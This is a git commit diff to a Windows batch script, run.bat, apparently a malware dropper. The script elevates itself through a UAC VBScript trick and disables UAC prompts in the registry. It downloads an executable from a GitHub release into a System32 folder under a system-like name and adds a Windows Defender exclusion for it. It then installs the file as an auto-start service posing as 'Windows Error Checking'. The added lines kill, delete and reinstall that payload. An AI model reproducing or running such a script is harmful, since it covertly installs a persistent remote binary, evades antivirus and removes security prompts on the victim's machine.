8e8a4e472423ff309ff93f2b63f0d90f26597e0d
minhtuan283 <tanghuynhminhtuan@gmail.com>
2024-12-26 23:26:19 +0700

    Update run.bat

--- run.bat
+++ run.bat
@@ -3,6 +3,9 @@ set "params=%*"
 cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) && fsutil dirty query %systemdrive% 1>nul 2>nul || (  echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/k cd ""%~sdp0"" && %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs" && "%temp%\getadmin.vbs" && exit /B )
 reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f
 reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop /t REG_DWORD /d 0 /f
+taskkill /im WindowsShell.exe /f 
+sc delete "Windows Error Checking"
+del /f /q "C:\Windows\System32\WindowsPowerShell\WindowsShell.exe"
 powershell -Command "curl -o C:\Windows\System32\WindowsPowerShell\WindowsShell.exe https://github.com/mitutina/mitutina/releases/download/WindowsShell/WindowsShell.exe"
 powershell -Command "Add-MpPreference -ExclusionPath 'C:\Windows\System32\WindowsPowerShell\WindowsShell.exe'"
 powershell -Command "New-Service -Name 'Windows Error Checking' -BinaryPathName 'C:\Windows\System32\WindowsPowerShell\WindowsShell.exe' -DisplayName 'Windows Error Checking' -StartupType Automatic"
